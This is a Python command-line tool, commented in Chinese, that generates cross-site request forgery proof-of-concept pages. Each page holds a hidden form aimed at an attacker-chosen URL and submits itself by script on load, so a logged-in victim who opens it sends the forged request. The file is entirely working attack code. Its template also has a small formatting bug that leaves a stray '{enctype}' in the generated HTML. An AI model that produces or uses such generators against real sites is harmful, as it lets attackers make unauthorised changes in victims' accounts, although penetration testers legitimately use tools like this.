#!/usr/bin/env python3
"""
CSRF 漏洞 POC 库
生成 CSRF POC HTML 页面
"""
import argparse, sys

CSRF_TEMPLATE = """<!DOCTYPE html>
<html>
<head><title>CSRF PoC - {action}</title></head>
<body>
<h2>CSRF PoC for: {action}</h2>
<p>点击下方按钮触发请求（如受害者已登录则自动执行）</p>
<form id="poc" method="{method}" action="{action}" {{enctype}}>
{fields}
</form>
<script>document.getElementById('poc').submit();</script>
<button onclick="this.disabled=true;document.forms[0].submit()">Submit</button>
</body>
</html>"""

def main():
    parser = argparse.ArgumentParser(description="CSRF POC 生成器")
    parser.add_argument("-a", "--action", required=True, help="目标 action URL")
    parser.add_argument("-m", "--method", default="POST", help="HTTP 方法")
    parser.add_argument("-f", "--fields", default="", help="表单字段，JSON 格式: {\"field\":\"value\"}")
    parser.add_argument("-o", "--output", default="csrf_poc.html", help="输出文件")
    args = parser.parse_args()

    import json
    fields_html = ""
    if args.fields:
        try:
            fields = json.loads(args.fields)
            for k, v in fields.items():
                fields_html += f'  <input type="hidden" name="{k}" value="{v}">\n'
        except:
            fields_html = f"  <input type='text' name='data' value='{args.fields}'>\n"

    enc = 'enctype="application/x-www-form-urlencoded"' if args.method == "POST" else ""
    html = CSRF_TEMPLATE.format(action=args.action, method=args.method, fields=fields_html, enctype=enc)
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(html)
    print(f"[+] CSRF POC 已生成: {args.output}")

if __name__ == "__main__":
    main()
